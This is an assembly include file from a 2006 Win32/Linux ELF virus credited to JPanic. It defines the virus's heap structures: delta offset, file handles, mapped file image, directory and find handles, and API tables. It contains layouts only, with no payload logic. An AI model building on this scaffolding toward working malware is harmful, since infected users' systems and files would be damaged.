;= Virus Heap Structure Definition (c) 2006 JPanic ========================
;
; Defines structure of virus heap and addressing shortcuts.
;
; General Layout:
; 	VirusDelta, FileHandle, FileSize, FileMappedImage,
;	OS_Proc_Table,
;	UNION {
;		Win32_Heap
;		Linux_Heap
;	}
;
;- Directive Warez --------------------------------------------------------
include inc\win32.inc
include inc\linux.inc
include inc\elf.inc
include inc\short.inc
include w32imps.ash
include osprocs.ash

		.486
		
;- Short Cuts -------------------------------------------------------------
vheap		EQU	(ebp-7Fh)
Win32_Heap	EQU	(vheap._Win32Heap)
Linux_Heap	EQU	(vheap._LinuxHeap)

;- Win32 Heap -------------------------------------------------------------
TWin32Heap			STRUC	
	dwFindHandle		dd	?	
	dwMapHandle		dd	?
	W32_IMP_LIST		<<dw!&_impname!& dd ?>>	
	WFF_Entry		WFF	<>
TWin32Heap			ENDS

Win32ProcAddr			=	(dwMapHandle + size dwMapHandle)
LastWin32ProcAddr               =       (Win32ProcAddr + (K32ProcCount * 4) - 4)

;- Linux Heap -------------------------------------------------------------
TLinuxHeap			STRUC	
	dwDirHandle		dd	?
	statbuf			stat	<>
        dirp			dirent	<>	
TLinuxHeap			ENDS

;- Complete Virus Heap ----------------------------------------------------
_VirusHeap			STRUC
	dwVirusDelta		dd	?
	dwFileHandle		dd	?
	dwMappedFile		dd	?
	dwFileSize		dd	?
	OS_PROC_LIST		<<dwV!&_procname!& dd ?>>
	UNION
		_Win32Heap		TWin32Heap	<>
		_LinuxHeap		TLinuxHeap	<>
	ENDS	
_VirusHeap			ENDS

VProcList		=	(dwFileSize + size dwFileSize)
	
;==========================================================================
		
